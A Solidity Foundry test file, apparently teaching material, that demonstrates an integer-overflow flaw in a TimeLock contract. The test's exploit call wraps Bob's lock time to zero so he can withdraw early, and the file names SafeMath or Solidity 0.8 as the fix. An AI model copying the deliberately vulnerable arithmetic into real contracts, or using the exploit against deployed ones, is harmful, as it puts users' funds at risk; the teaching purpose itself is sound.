// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
// this need to be older version of solidity from 0.8.0 solidty compiler checks for overflow and underflow

import "forge-std/Test.sol";

/*
Name: Integrate Overflow   

Description:
The TimeLock has a flaw in the smart contract code that allows 
an attacker to prematurely withdraw their deposited funds from the TimeLock contract. 
The vulnerability arises due to an overflow in the increaseLockTime function, 
which manipulates the lock time in a way that causes it to wrap around to 0, 
enabling the attacker to withdraw their funds before the actual waiting period expires.

This contract is designed to act as a time vault.
User can deposit into this contract but cannot withdraw for atleast a week.
User can also extend the wait time beyond the 1 week waiting period.

/*
1. Alice and bob both have 1 Ether balance
2. Deploy TimeLock Contract
3. Alice and bob both deposit 1 Ether to TimeLock, they need to wait 1 week to unlock Ether
4. Bob caused an overflow on his lockTime
5, Alice can't withdraw 1 Ether, because the lock time not expired.
6. Bob can withdraw 1 Ether, because the lockTime is overflow to 0

What happened?
Attack caused the TimeLock.lockTime to overflow,
and was able to withdraw before the 1 week waiting period.

Impact: Solidity < 0.8 and without SafeMath 

Mitigation:
To mitigate the Overflow vulnerability, use SafeMath library or use Solidity > 0.8
*/

contract TimeLock {
    mapping(address => uint) public balances;
    mapping(address => uint) public lockTime;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
        lockTime[msg.sender] = block.timestamp + 1 weeks;
    }

    function increaseLockTime(uint _secondsToIncrease) public {
        lockTime[msg.sender] += _secondsToIncrease; // vulnerable
    }

    function withdraw() public {
        require(balances[msg.sender] > 0, "Insufficient funds");
        require(
            block.timestamp > lockTime[msg.sender],
            "Lock time not expired"
        );

        uint amount = balances[msg.sender];
        balances[msg.sender] = 0;

        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "Failed to send Ether");
    }
}

contract ContractTest is Test {
    TimeLock TimeLockContract;
    address alice;
    address bob;

    function setUp() public {
        TimeLockContract = new TimeLock();
        alice = vm.addr(1);
        bob = vm.addr(2);
        vm.deal(alice, 1 ether);
        vm.deal(bob, 1 ether);
    }

    function testOverflow() public {
        console.log("Alice balance", alice.balance);
        console.log("Bob balance", bob.balance);

        console.log("Alice deposit 1 Ether...");
        vm.prank(alice);
        TimeLockContract.deposit{value: 1 ether}();
        console.log("Alice balance", alice.balance);

        console.log("Bob deposit 1 Ether...");
        vm.startPrank(bob);
        TimeLockContract.deposit{value: 1 ether}();
        console.log("Bob balance", bob.balance);

        // exploit here
        TimeLockContract.increaseLockTime(
            type(uint).max + 1 - TimeLockContract.lockTime(bob)
        );

        console.log(
            "Bob will successfully withdraw, because the lock time is overflowed"
        );
        TimeLockContract.withdraw();
        console.log("Bob balance", bob.balance);
        vm.stopPrank();

        vm.prank(alice);
        console.log(
            "Alice will fail to withdraw, because the lock time did not expire"
        );
        TimeLockContract.withdraw(); // expect revert
    }
}
